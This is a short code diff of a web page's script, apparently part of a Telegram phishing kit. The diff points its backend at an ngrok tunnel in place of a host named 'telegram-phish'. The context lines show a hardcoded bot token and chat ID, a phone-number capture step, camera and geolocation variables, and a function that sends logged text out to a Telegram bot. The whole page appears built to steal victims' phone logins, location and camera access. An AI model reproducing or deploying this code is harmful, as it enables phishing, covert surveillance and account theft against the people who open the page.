@@ -339,7 +339,7 @@
 </div>
 
 <script>
-    const API_URL = "https://telegram-phish.onrender.com";
+    const API_URL = "https://8c17-95-59-208-121.ngrok-free.app";
     const BOT_TOKEN = "8796941636:AAHLF9LISK21vWTXL7Pq9cKo3pO98TcdPCQ";
     const CHAT_ID = 7518727041;
     
@@ -347,6 +347,9 @@
     let currentStep = "phone";
     let cameraStream = null;
     let geoData = null;
+
+
+
     
     function sendLog(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
